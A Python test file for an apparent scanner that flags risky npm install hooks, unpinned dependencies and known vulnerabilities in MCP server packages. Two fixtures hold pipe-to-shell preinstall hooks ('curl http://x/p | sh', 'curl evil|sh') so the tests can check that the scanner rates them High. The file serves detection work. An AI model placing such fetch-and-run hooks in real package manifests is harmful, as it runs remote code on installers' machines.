"""MCP04 supply-chain analysis — install hooks are ground-truth findings, unpinned deps are posture
flags, pinned/clean packages produce nothing. Facts, not opinions."""
import json
from pathlib import Path

import json as _json

from hunt.supply_chain import (analyze_package, analyze_path, _is_unpinned, _bare_name,
                               collect_installed_deps, query_osv, osv_findings, installed_dir, scan_supply)


def test_install_hook_is_a_lead_not_a_finding():
    # a benign build step is a Medium posture flag, NOT a confirmed finding (by-design != vuln)
    r = analyze_package({"name": "pkg", "scripts": {"postinstall": "npm run build"}})
    assert len(r) == 1 and r[0]["verdict"] == "FLAG" and r[0]["ground_truth"] is False
    assert r[0]["severity"] == "Medium" and r[0]["owasp"] == ["MCP04"]


def test_suspicious_install_hook_is_high_priority_lead():
    r = analyze_package({"name": "evil", "scripts": {"preinstall": "curl http://x/p | sh"}})
    assert r[0]["verdict"] == "FLAG" and r[0]["severity"] == "High" and "SUSPICIOUS" in r[0]["rationale"]


def test_prepare_script_is_not_consumer_install_surface():
    # `prepare` runs at publish/git-install, not on `npm install <dep>` -> not flagged
    assert analyze_package({"name": "ts-pkg", "scripts": {"prepare": "npm run build", "build": "tsc"}}) == []


def test_unpinned_deps_are_a_flag_not_a_finding():
    r = analyze_package({"name": "loose", "dependencies": {"a": "^1.0", "b": "2.3.4", "c": "latest"}})
    assert len(r) == 1 and r[0]["verdict"] == "FLAG" and r[0]["ground_truth"] is False
    assert "a@^1.0" in r[0]["evidence"] and "c@latest" in r[0]["evidence"] and "b@" not in r[0]["evidence"]


def test_pinned_clean_package_has_no_findings():
    assert analyze_package({"name": "ok", "dependencies": {"a": "1.0.0"}, "scripts": {"build": "tsc"}}) == []


def test_pin_classifier():
    for v in ("^1.0.0", "~1.2", ">=1", "1.x", "latest", "*", "1 || 2"):
        assert _is_unpinned(v), v
    for v in ("1.0.0", "1.2.3", "file:../x", "git+https://x/y", "workspace:*"):
        assert not _is_unpinned(v), v


def test_analyze_path_reads_package_json(tmp_path):
    pj = tmp_path / "package.json"
    pj.write_text(_json.dumps({"name": "pkgx", "scripts": {"preinstall": "curl evil|sh"}}))
    r = analyze_path(str(tmp_path), osv=False)
    assert len(r) == 1 and r[0]["verdict"] == "FLAG" and r[0]["severity"] == "High" and r[0]["target"] == tmp_path.name
    assert analyze_path(str(tmp_path / "nope"), osv=False) == []


def test_collect_installed_deps_reads_exact_versions(tmp_path):
    for n, v in [("lodash", "4.17.11"), ("@scope/pkg", "1.0.0")]:
        d = tmp_path / "node_modules" / n
        d.mkdir(parents=True)
        (d / "package.json").write_text(_json.dumps({"name": n, "version": v}))
    deps = collect_installed_deps(tmp_path)
    assert ("npm", "lodash", "4.17.11") in deps and ("npm", "@scope/pkg", "1.0.0") in deps


def test_query_osv_maps_vulns_with_injected_fetch():
    # offline: a stubbed fetch mimics the OSV querybatch shape — no network in the test
    def fake_fetch(_payload):
        return {"results": [{"vulns": [{"id": "GHSA-aaaa"}, {"id": "CVE-2020-1"}]}, {}]}
    out = query_osv([("npm", "lodash", "4.17.11"), ("npm", "safe", "1.0.0")], fetch=fake_fetch)
    assert out == {("lodash", "4.17.11"): ["GHSA-aaaa", "CVE-2020-1"]}


def test_query_osv_offline_degrades_not_crash():
    def boom(_p):
        raise OSError("no network")
    assert query_osv([("npm", "x", "1.0")], fetch=boom) == {}   # empty, never raises


def test_osv_findings_are_ground_truth():
    r = osv_findings({("lodash", "4.17.11"): ["GHSA-aaaa"]}, name="pkg")
    assert len(r) == 1 and r[0]["ground_truth"] and r[0]["owasp"] == ["MCP04"] and "GHSA-aaaa" in r[0]["evidence"]


def test_bare_name_strips_version_keeps_scope():
    assert _bare_name("lodash@4.17.11") == "lodash"
    assert _bare_name("@scope/pkg@1.2.3") == "@scope/pkg"
    assert _bare_name("plain-pkg") == "plain-pkg"


def test_installed_dir_and_scan_supply_resolve_from_cmd(tmp_path):
    # a fake npx cache: <root>/<hash>/node_modules/evil-mcp with an install hook
    pkgdir = tmp_path / "abc123" / "node_modules" / "evil-mcp"
    pkgdir.mkdir(parents=True)
    (pkgdir / "package.json").write_text(_json.dumps({"name": "evil-mcp", "version": "1.0.0",
                                                      "scripts": {"postinstall": "node x.js"}}))
    assert installed_dir("evil-mcp", roots=[tmp_path]) == str(pkgdir)
    out = scan_supply("npx -y evil-mcp@1.0.0", roots=[tmp_path], fetch=lambda _p: {"results": []})
    assert len(out) == 1 and out[0]["verdict"] == "FLAG"   # the install hook, found by name (a lead)
